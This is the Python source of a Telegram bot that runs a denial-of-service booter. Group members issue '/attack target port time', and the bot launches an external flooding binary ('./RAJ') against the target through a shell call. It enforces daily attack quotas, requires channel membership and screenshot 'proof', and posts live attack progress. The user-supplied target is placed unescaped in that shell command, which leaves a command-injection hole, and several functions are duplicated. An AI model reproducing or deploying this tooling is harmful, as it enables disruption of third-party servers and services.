#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import logging
from config import BOT_TOKEN, ADMIN_ID, CHANNEL_USERNAME, FEEDBACK_CHANNEL, ALLOWED_GROUPS

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize bot with token from config
bot = telebot.TeleBot(BOT_TOKEN)

# Verify feedback channel exists
try:
    bot.get_chat(FEEDBACK_CHANNEL)
    logger.info(f"Feedback channel {FEEDBACK_CHANNEL} is accessible")
except Exception as e:
    logger.error(f"ERROR: Feedback channel {FEEDBACK_CHANNEL} not accessible: {e}")
    exit(1)

# Configuration Settings
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
SCREENSHOT_TIMEOUT = 300  # 5 minutes in seconds
BAN_DURATION = 1800  # 30 minutes in seconds
global_last_attack_time = None
pending_feedback = {}  
pending_screenshot = {}  
active_attacks = {}  # Track currently running attacks

# File Management
USER_FILE = "users.txt"
ALLOWED_GROUPS_FILE = "allowed_groups.txt"
user_data = {}

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                user_id = parts[0]
                user_data[user_id] = {
                    'attacks': int(parts[1]),
                    'last_reset': datetime.datetime.fromisoformat(parts[2]),
                    'last_attack': datetime.datetime.fromisoformat(parts[3]) if parts[3] != 'None' else None,
                    'attack_blocked_until': float(parts[4]) if len(parts) > 4 and parts[4] != 'None' else 0
                }
        logger.info(f"Loaded {len(user_data)} users from {USER_FILE}")
    except FileNotFoundError:
        logger.warning(f"User file {USER_FILE} not found, starting fresh")
    except Exception as e:
        logger.error(f"Error loading users: {e}")

def save_users():
    try:
        with open(USER_FILE, "w") as file:
            for user_id, data in user_data.items():
                last_attack = data['last_attack'].isoformat() if data['last_attack'] else 'None'
                blocked_until = str(data.get('attack_blocked_until', 0)) if data.get('attack_blocked_until', 0) > 0 else 'None'
                file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()},{last_attack},{blocked_until}\n")
        logger.info(f"Saved {len(user_data)} users to {USER_FILE}")
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def load_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, "r") as file:
            groups = [line.strip() for line in file]
            logger.info(f"Loaded {len(groups)} groups from {ALLOWED_GROUPS_FILE}")
            return groups
    except FileNotFoundError:
        logger.info(f"Using default allowed groups from config")
        return ALLOWED_GROUPS
    except Exception as e:
        logger.error(f"Error loading allowed groups: {e}")
        return ALLOWED_GROUPS

def save_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, "w") as file:
            for group_id in allowed_groups:
                file.write(f"{group_id}\n")
        logger.info(f"Saved {len(allowed_groups)} groups to {ALLOWED_GROUPS_FILE}")
    except Exception as e:
        logger.error(f"Error saving allowed groups: {e}")

allowed_groups = load_allowed_groups()

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False

def send_attack_message(chat_id, message, photo_file_id=None):
    styles = [
        "🟢🔵🟣⚫⚪🟤🔴🟠🟡🟢🔵",
        "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
        "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅",
        "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
        "✦•·················•✦•·············•✦",
        "⚡•»»————⍟————««•⚡•»»————⍟————««•⚡",
        "▄︻デ══━一••••••••••••••••••••••••••••••一━══デ︻▄"
    ]
    border = random.choice(styles)
    full_msg = f"{border}\n{message}\n{border}"
    
    try:
        if photo_file_id:
            bot.send_photo(chat_id, photo_file_id, caption=full_msg, parse_mode="HTML")
        else:
            bot.send_message(chat_id, full_msg, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error sending message: {e}")

@bot.message_handler(commands=['check'])
def check_attack_status(message):
    user_id = str(message.from_user.id)
    group_id = str(message.chat.id)
    
    # Check if user is blocked from attacking
    if user_data.get(user_id, {}).get('attack_blocked_until', 0) > time.time():
        remaining = user_data[user_id]['attack_blocked_until'] - time.time()
        mins, secs = divmod(int(remaining), 60)
        
        send_attack_message(message.chat.id,
            f"╔═��══════════════════════════════╗\n"
            f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Reason: Failed to provide screenshot proof\n"
            f"🔸 Block time remaining: {mins}m {secs}s\n\n"
            f"⚠️ You can still chat but cannot launch attacks\n"
            f"⏳ Block expires at: {datetime.datetime.fromtimestamp(user_data[user_id]['attack_blocked_until']).strftime('%H:%M:%S')}")
        return
    
    # Check if user has any active attack
    if user_id in active_attacks:
        attack_data = active_attacks[user_id]
        elapsed = time.time() - attack_data['start_time']
        remaining = max(0, attack_data['duration'] - elapsed)
        
        # Get user details
        try:
            user = bot.get_chat_member(group_id, user_id).user
            username = f"@{user.username}" if user.username else user.first_name
        except:
            username = "Unknown User"
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⏳ ATTACK IN PROGRESS ⏳ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 <b>Attacker:</b> <code>{username}</code>\n"
            f"🔸 <b>Target:</b> <code>{attack_data['target']}</code>\n"
            f"🔹 <b>Time Remaining:</b> <code>{int(remaining)} seconds</code>\n\n"
            f"⚠️ Screenshot required within {max(0, SCREENSHOT_TIMEOUT - elapsed):.0f}s")
    elif pending_feedback.get(user_id, False):
        elapsed = time.time() - pending_screenshot[user_id]['start_time']
        remaining = max(0, SCREENSHOT_TIMEOUT - elapsed)
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 📸 PENDING SCREENSHOT 📸 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You have a completed attack\n"
            f"🔸 Please send screenshot proof\n\n"
            f"⏳ <b>Time remaining:</b> <code>{int(remaining)} seconds</code>\n"
            f"⚠️ After timeout: 30 minute attack block")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ℹ️ NO ACTIVE ATTACKS ℹ️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You don't have any active attacks\n"
            f"🔸 Start new attack with /attack")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        try:
            # Forward screenshot to feedback channel
            bot.forward_message(FEEDBACK_CHANNEL, message.chat.id, message.message_id)
            
            # Clear pending status and active attack
            pending_feedback[user_id] = False
            pending_screenshot[user_id] = False
            active_attacks.pop(user_id, None)
            
            # Notify user
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ ✅ SCREENSHOT VERIFIED ✅ ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 Your attack proof has been recorded!\n"
                "🔸 You can now launch new attacks\n\n"
                f"⏳ Next attack available: <b>Now</b>")
            
            # Notify admin
            for admin in ADMIN_ID:
                try:
                    bot.send_message(admin, 
                        f"📸 New screenshot received\n"
                        f"From: {message.from_user.first_name}\n"
                        f"ID: {user_id}\n"
                        f"Group: {message.chat.title if message.chat.title else 'Private'}")
                except Exception as e:
                    logger.error(f"Error notifying admin: {e}")
                    
            logger.info(f"Processed screenshot from user {user_id}")
            
        except Exception as e:
            logger.error(f"Error handling screenshot: {e}")
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ ❌ SCREENSHOT ERROR ❌ ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 Please try sending again\n"
                "🔸 Contact admin if problem persists")
    else:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ℹ️ NO PENDING ATTACKS ℹ️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 You don't have any attacks requiring screenshots\n"
            "🔸 Start an attack first with /attack")

def check_screenshot_timeout(user_id, group_id):
    """Check if user sent screenshot within timeout period"""
    start_time = pending_screenshot.get(user_id, {}).get('start_time', time.time())
    time_left = SCREENSHOT_TIMEOUT - (time.time() - start_time)
    
    if time_left > 0:
        time.sleep(time_left)
    
    if pending_feedback.get(user_id, False):
        try:
            # Block attack access instead of banning
            if user_id not in user_data:
                user_data[user_id] = {
                    'attacks': 0,
                    'last_reset': datetime.datetime.now(),
                    'last_attack': None,
                    'attack_blocked_until': time.time() + BAN_DURATION
                }
            else:
                user_data[user_id]['attack_blocked_until'] = time.time() + BAN_DURATION
            save_users()
            
            send_attack_message(group_id,
                f"╔════════════════════════════════╗\n"
                f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
                f"╚════════════════════════════════╝\n\n"
                f"🔹 User ID: <code>{user_id}</code>\n"
                f"🔸 Duration: 30 minutes\n"
                f"🔹 Reason: Failed to provide attack proof\n\n"
                f"⚠️ You can still chat but cannot launch attacks\n"
                f"⏳ Block expires at: {datetime.datetime.fromtimestamp(time.time() + BAN_DURATION).strftime('%H:%M:%S')}")
            logger.info(f"Blocked attack access for user {user_id}")
        except Exception as e:
            logger.error(f"Error in screenshot check: {e}")
        finally:
            pending_feedback[user_id] = False
            pending_screenshot[user_id] = False
            active_attacks.pop(user_id, None)

# Add these at the top with other configurations
CURRENT_ATTACK = None
ATTACK_LOCK = threading.Lock()
LIVE_STATUS_INTERVAL = 5  # seconds between status updates

# New function for live status updates
def send_live_status(chat_id, target, duration, user_name, start_time, original_msg_id):
    """Send live attack status updates with dynamic styling"""
    status_msg = None
    styles = [
        "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
        "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
        "⚡•»»————⍟————««•⚡•»»————⍟————««•⚡"
    ]
    
    while time.time() - start_time < duration and CURRENT_ATTACK is not None:
        elapsed = time.time() - start_time
        remaining = max(0, duration - elapsed)
        
        # Dynamic styling based on remaining time
        if remaining > duration * 0.7:
            style = random.choice([
                "🟢⚡️🟢⚡️🟢⚡️🟢",
                "🟢✦🟢✦🟢✦🟢✦🟢",
                "🟢•🟢•🟢•🟢•🟢•🟢"
            ])
            status_emoji = "🟢"
        elif remaining > duration * 0.3:
            style = random.choice([
                "🟡⚡️🟡⚡️🟡⚡️🟡",
                "🟡✦🟡✦🟡✦🟡✦🟡",
                "🟡•🟡•🟡•🟡•🟡•🟡"
            ])
            status_emoji = "🟡"
        else:
            style = random.choice([
                "🔴⚡️🔴⚡️🔴⚡️🔴",
                "🔴✦🔴✦🔴✦🔴✦🔴",
                "🔴•🔴•🔴•🔴•🔴•🔴"
            ])
            status_emoji = "🔴"
            
        mins, secs = divmod(int(remaining), 60)
        time_str = f"{mins:02d}:{secs:02d}"
        
        # Create animated progress bar
        progress_width = 20
        progress = int((remaining/duration) * progress_width)
        animated_char = random.choice(["⚡", "✦", "•", "»", "«"])
        progress_bar = "▰" * progress + animated_char + "▱" * (progress_width - progress - 1)
        
        try:
            if status_msg is None:
                status_msg = bot.send_message(
                    chat_id=chat_id,
                    text=f"""
{style}
╔════════════════════════════════╗
║   🚀 LIVE ATTACK IN PROGRESS 🚀  ║
╚════════════════════════════════╝

{status_emoji} <b>Attacker:</b> <code>{user_name}</code>
🎯 <b>Target:</b> <code>{target}</code>
⏳ <b>Time Remaining:</b> <code>{time_str}</code>

[{progress_bar}] {int((duration - remaining)/duration*100)}%

⚡️ <i>Next attack available in: {time_str}</i>
{style}
""",
                    parse_mode="HTML",
                    reply_to_message_id=original_msg_id
                )
                active_attacks[CURRENT_ATTACK]['status_message_id'] = status_msg.message_id
            else:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_msg.message_id,
                    text=f"""
{style}
╔════════════════════════════════╗
║   🚀 LIVE ATTACK IN PROGRESS 🚀  ║
╚════════════════════════════════╝

{status_emoji} <b>Attacker:</b> <code>{user_name}</code>
🎯 <b>Target:</b> <code>{target}</code>
⏳ <b>Time Remaining:</b> <code>{time_str}</code>

[{progress_bar}] {int((duration - remaining)/duration*100)}%

⚡️ <i>Next attack available in: {time_str}</i>
{style}
""",
                    parse_mode="HTML"
                )
        except Exception as e:
            logger.error(f"Error updating live status: {e}")
def send_attack_message(chat_id, message, photo_file_id=None):
    styles = [
        "🟢🔵🟣⚫⚪🟤🔴🟠🟡🟢🔵",
        "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
        "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅",
        "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁"
    ]
    border = random.choice(styles)
    full_msg = f"{border}\n{message}\n{border}"
    
    try:
        if photo_file_id:
            bot.send_photo(chat_id, photo_file_id, caption=full_msg, parse_mode="HTML")
        else:
            bot.send_message(chat_id, full_msg, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        # Fallback to plain text if HTML fails
        try:
            bot.send_message(chat_id, full_msg)
        except Exception as e:
            logger.error(f"Error sending plain text message: {e}")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global CURRENT_ATTACK
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "N/A"
    group_id = str(message.chat.id)

    # [Previous checks remain the same...]

    # Parse command
    try:
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError("Invalid command format")
        
        target = parts[1]
        port = int(parts[2])
        time_duration = int(parts[3])
        
        # Validate inputs
        if port < 1 or port > 65535:
            raise ValueError("Port must be between 1-65535")
        if time_duration < 10 or time_duration > 300:
            raise ValueError("Duration must be between 10-300 seconds")
            
    except ValueError as e:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⚠️ INVALID COMMAND ⚠️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Error: {str(e)}\n"
            f"🔸 Correct format: <code>/attack target port time</code>\n"
            f"🔹 Example: <code>/attack example.com 80 60</code>")
        return

    # [Rest of the function remains the same, but ensure all message formatting uses valid HTML tags]

    # Check if user is blocked from attacking
    if user_data.get(user_id, {}).get('attack_blocked_until', 0) > time.time():
        remaining = user_data[user_id]['attack_blocked_until'] - time.time()
        mins, secs = divmod(int(remaining), 60)
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Reason: Failed to provide screenshot proof\n"
            f"🔸 Block time remaining: {mins}m {secs}s\n\n"
            f"⚠️ You can still chat but cannot launch attacks\n"
            f"⏳ Block expires at: {datetime.datetime.fromtimestamp(user_data[user_id]['attack_blocked_until']).strftime('%H:%M:%S')}")
        return

    # Check if user is in required channel
    if not is_user_in_channel(user_id):
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 🚫 CHANNEL MEMBERSHIP REQUIRED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You must join our channel to use this bot\n"
            f"🔸 Channel: @{CHANNEL_USERNAME}")
        return

    # Check if group is allowed
    if group_id not in allowed_groups:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 🚫 GROUP NOT AUTHORIZED 🚫 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 This group is not authorized to use the bot\n"
            "🔸 Contact admin to add this group")
        return

    # Check if user has pending screenshot
    if pending_feedback.get(user_id, False):
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 📸 PENDING SCREENSHOT 📸 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 You have a completed attack\n"
            "🔸 Please send screenshot proof first")
        return

    # Parse command
    try:
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError("Invalid command format")
        
        target = parts[1]
        port = int(parts[2])
        time_duration = int(parts[3])
        
        # Validate inputs
        if port < 1 or port > 65535:
            raise ValueError("Port must be between 1-65535")
        if time_duration < 10 or time_duration > 300:
            raise ValueError("Duration must be between 10-300 seconds")
            
    except ValueError as e:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⚠️ INVALID COMMAND ⚠️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Error: {str(e)}\n"
            f"🔸 Correct format: /attack <target> <port> <time>\n"
            f"🔹 Example: /attack example.com 80 60")
        return

    # Check if attack is already running
    with ATTACK_LOCK:
        if CURRENT_ATTACK is not None:
            # Get current attack info
            attack_data = active_attacks.get(CURRENT_ATTACK, {})
            elapsed = time.time() - attack_data.get('start_time', time.time())
            remaining = max(0, attack_data.get('duration', 0) - elapsed)
            mins, secs = divmod(int(remaining), 60)
            
            try:
                current_user = bot.get_chat_member(group_id, CURRENT_ATTACK).user
                current_name = f"@{current_user.username}" if current_user.username else current_user.first_name
            except:
                current_name = "Another user"
            
            # Stylish wait message with dynamic border
            borders = [
                "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
                "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
                "⚡•»»————⍟————««•⚡•»»————⍟————««•⚡",
                "▄︻デ══━一••••••••••••••••••••••••••••••一━══デ︻▄"
            ]
            border = random.choice(borders)
            
            # Create animated waiting message
            wait_emojis = ["⏳", "⌛", "⏱️", "🕰️"]
            wait_emoji = random.choice(wait_emojis)
            
            send_attack_message(message.chat.id,
                f"""
{border}
╔════════════════════════════════╗
║       {wait_emoji} ATTACK IN PROGRESS {wait_emoji}      ║
╚════════════════════════════════╝

⚡️ <b>Current Attacker:</b> <code>{current_name}</code>
⏱️ <b>Time Remaining:</b> <code>{mins}m {secs}s</code>

💡 Please wait for current attack to finish
   before launching your own attack!

{border}
""")
            return

        # Check user's attack limit
        if user_data.get(user_id, {}).get('attacks', 0) >= ATTACK_LIMIT:
            reset_time = time_until_reset(user_id)
            send_attack_message(message.chat.id,
                f"╔════════════════════════════════╗\n"
                f"║ 🚫 DAILY LIMIT REACHED 🚫 ║\n"
                f"╚════════════════════════════════╝\n\n"
                f"🔹 You've used all {ATTACK_LIMIT} daily attacks\n"
                f"🔸 Reset in: {reset_time}")
            return

        # Check cooldown
        last_attack = user_data.get(user_id, {}).get('last_attack')
        if last_attack and (datetime.datetime.now() - last_attack).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (datetime.datetime.now() - last_attack).total_seconds()
            mins, secs = divmod(int(remaining), 60)
            send_attack_message(message.chat.id,
                f"╔════════════════════════════════╗\n"
                f"║ ⏳ COOLDOWN ACTIVE ⏳ ║\n"
                f"╚════════════════════════════════╝\n\n"
                f"🔹 Please wait before launching another attack\n"
                f"🔸 Time remaining: {mins}m {secs}s")
            return

        # Get profile photo for verification
        try:
            photos = bot.get_user_profile_photos(user_id, limit=1)
            photo_file_id = photos.photos[0][-1].file_id if photos.photos else None
        except Exception as e:
            logger.error(f"Error getting profile photo: {e}")
            photo_file_id = None

        # Start attack process
        CURRENT_ATTACK = user_id
        launch_attack(message, target, port, time_duration, user_id, user_name, username, photo_file_id, group_id)

# Modified launch_attack function
def launch_attack(message, target, port, time_duration, user_id, user_name, username, photo_file_id, group_id):
    """Launch attack with all checks passed"""
    # Stylish attack initiation message
    borders = [
        "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
        "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
        "⚡•»»————⍟————««•⚡•»»————⍟————««•⚡"
    ]
    border = random.choice(borders)
    
    attack_msg = f"""
{border}
╔════════════════════════════════╗
║ ⚡ ATTACK INITIATED ⚡ ║
╚════════════════════════════════╝

🔸 <b>Commander:</b> <code>{user_name}</code>
🔹 <b>Username:</b> <code>{username}</code>

╔═════════════════════════════╗
║ 🎯 <b>Target:</b> <code>{target}:{port}</code>
║ ⏳ <b>Duration:</b> <code>{time_duration}s</code>
║ 💥 <b>Power:</b> <code>800</code>
╚═════════════════════════════╝

⚠️ <b>SCREENSHOT REQUIRED WITHIN 5 MINUTES</b> ⚠️
⏰ <i>Timeout at: {(datetime.datetime.now() + datetime.timedelta(seconds=SCREENSHOT_TIMEOUT)).strftime('%H:%M:%S')}</i>
{border}
"""
    
    # Send attack initiation message
    msg = bot.send_message(
        chat_id=message.chat.id,
        text=attack_msg,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
    
    # Mark attack as active
    active_attacks[user_id] = {
        'start_time': time.time(),
        'duration': time_duration,
        'target': f"{target}:{port}",
        'status_message_id': msg.message_id
    }
    
    # Set pending flags
    pending_feedback[user_id] = True
    pending_screenshot[user_id] = {
        'start_time': time.time(),
        'group_id': group_id
    }
    
    # Start live status updates
    threading.Thread(
        target=send_live_status,
        args=(message.chat.id, f"{target}:{port}", time_duration, user_name, 
              active_attacks[user_id]['start_time'], msg.message_id)
    ).start()
    
    # Start attack in background
    threading.Thread(target=execute_attack, args=(message, target, port, time_duration, user_id, group_id)).start()
    logger.info(f"Attack started by {user_id} on {target}:{port} for {time_duration}s")
    
    # Start screenshot timeout check
    threading.Thread(target=check_screenshot_timeout, args=(user_id, group_id)).start()

def execute_attack(message, target, port, time_duration, user_id, group_id):
    """Execute the actual attack command"""
    global CURRENT_ATTACK  # Add this line at the beginning of the function
    
    try:
        # Simulate attack (replace with actual command)
        subprocess.run(f"./RAJ {target} {port} {time_duration}", shell=True, check=True)
        
        # Update user data
        user_data[user_id]['attacks'] += 1
        user_data[user_id]['last_attack'] = datetime.datetime.now()
        save_users()
        
        # Final completion message
        if user_id in active_attacks:
            borders = [
                "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
                "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
                "✨✨✨✨✨✨✨✨✨✨"
            ]
            border = random.choice(borders)
            
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=active_attacks[user_id]['status_message_id'],
                text=f"""
{border}
╔════════════════════════════════╗
║       ✅ ATTACK COMPLETED ✅       ║
╚════════════════════════════════╝

🎯 <b>Target:</b> <code>{target}:{port}</code>
⏱️ <b>Duration:</b> <code>{time_duration}s</code>

📸 Please send screenshot proof within 5 minutes!
{border}
""",
                parse_mode="HTML"
            )
            
    except subprocess.CalledProcessError as e:
        logger.error(f"Attack failed for {user_id}: {e}")
        send_attack_message(message.chat.id, 
            f"╔════════════════════════════════╗\n"
            f"║ ❌ ATTACK FAILED ❌ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Error: <code>{e}</code>\n"
            f"🔸 Please try again later")
    finally:
        # Clean up after attack completes
        with ATTACK_LOCK:
            active_attacks.pop(user_id, None)
            CURRENT_ATTACK = None
            pending_feedback.pop(user_id, None)
            pending_screenshot.pop(user_id, None)

def time_until_reset(user_id):
    """Calculate time until daily reset"""
    now = datetime.datetime.now()
    last_reset = user_data[user_id]['last_reset']
    next_reset = last_reset + datetime.timedelta(days=1)
    time_left = next_reset - now
    
    hours, remainder = divmod(time_left.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"
    
@bot.message_handler(commands=['check'])
def check_attack_status(message):
    group_id = str(message.chat.id)
    
    # Get all active attacks in this group
    active_in_group = []
    for user_id, attack_data in active_attacks.items():
        if pending_screenshot.get(user_id, {}).get('group_id') == group_id:
            elapsed = time.time() - attack_data['start_time']
            remaining = max(0, attack_data['duration'] - elapsed)
            
            try:
                user = bot.get_chat_member(group_id, user_id).user
                username = f"@{user.username}" if user.username else user.first_name
            except:
                username = f"User {user_id}"
                
            active_in_group.append({
                'username': username,
                'target': attack_data['target'],
                'remaining': remaining,
                'screenshot_time_left': max(0, SCREENSHOT_TIMEOUT - elapsed)
            })
    
    # Format the message
    if active_in_group:
        attack_list = "\n\n".join([
            f"⚔️ <b>Attacker:</b> <code>{attack['username']}</code>\n"
            f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
            f"⏳ <b>Time Left:</b> <code>{int(attack['remaining'])}s</code>\n"
            f"📸 <b>Screenshot Due:</b> <code>{int(attack['screenshot_time_left'])}s</code>"
            for attack in active_in_group
        ])
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⚡ ACTIVE GROUP ATTACKS ⚡ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"{attack_list}\n\n"
            f"🔹 Total Attacks: {len(active_in_group)}")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ℹ️ NO ACTIVE ATTACKS ℹ️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Currently no active attacks in this group\n"
            f"🔸 Start new attack with /attack")
            
@bot.message_handler(commands=['addgroup'])
def add_group(message):
    """Add a group to allowed list (Admin only)"""
    user_id = str(message.from_user.id)
    
    if user_id not in ADMIN_ID:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 🚫 ADMIN ACCESS REQUIRED 🚫 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 This command is for admins only")
        return
    
    try:
        group_id = message.text.split()[1]
    except IndexError:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ INVALID FORMAT ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Usage: <code>/addgroup &lt;group_id&gt;</code>\n"
            "🔸 Example: <code>/addgroup -100123456789</code>")
        return
    
    if group_id not in allowed_groups:
        allowed_groups.append(group_id)
        save_allowed_groups()
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ✅ GROUP ADDED ✅ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Group ID: <code>{group_id}</code>\n"
            f"🔸 Now authorized to use bot commands")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ℹ️ GROUP ALREADY EXISTS ℹ️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Group ID: <code>{group_id}</code>\n"
            f"🔸 Was already in allowed list")

@bot.message_handler(commands=['removegroup'])
def remove_group(message):
    """Remove a group from allowed list (Admin only)"""
    user_id = str(message.from_user.id)
    
    if user_id not in ADMIN_ID:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 🚫 ADMIN ACCESS REQUIRED 🚫 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 This command is for admins only")
        return
    
    try:
        group_id = message.text.split()[1]
    except IndexError:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ INVALID FORMAT ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Usage: <code>/removegroup &lt;group_id&gt;</code>\n"
            "🔸 Example: <code>/removegroup -100123456789</code>")
        return
    
    if group_id in allowed_groups:
        allowed_groups.remove(group_id)
        save_allowed_groups()
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 🗑️ GROUP REMOVED 🗑️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Group ID: <code>{group_id}</code>\n"
            f"🔸 No longer authorized to use bot commands")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ❌ GROUP NOT FOUND ❌ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Group ID: <code>{group_id}</code>\n"
            f"🔸 Was not in allowed list")

@bot.message_handler(commands=['listgroups'])
def list_groups(message):
    """List all allowed groups (Admin only)"""
    user_id = str(message.from_user.id)
    
    if user_id not in ADMIN_ID:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 🚫 ADMIN ACCESS REQUIRED 🚫 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 This command is for admins only")
        return
    
    if not allowed_groups:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ℹ️ NO GROUPS FOUND ℹ️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 No groups are currently authorized")
        return
    
    group_list = "\n".join([f"🔹 <code>{group_id}</code>" for group_id in allowed_groups])
    send_attack_message(message.chat.id,
        f"╔════════════════════════════════╗\n"
        f"║ 📜 AUTHORIZED GROUPS 📜 ║\n"
        f"╚════════════════════════════════╝\n\n"
        f"{group_list}\n\n"
        f"🔸 Total: {len(allowed_groups)} groups")

@bot.message_handler(commands=['resetuser'])
def reset_user(message):
    """Reset a user's attack data (Admin only)"""
    user_id = str(message.from_user.id)
    
    if user_id not in ADMIN_ID:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 🚫 ADMIN ACCESS REQUIRED 🚫 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 This command is for admins only")
        return
    
    try:
        target_user_id = message.text.split()[1]
    except IndexError:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ INVALID FORMAT ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Usage: <code>/resetuser &lt;user_id&gt;</code>\n"
            "🔸 Example: <code>/resetuser 123456789</code>")
        return
    
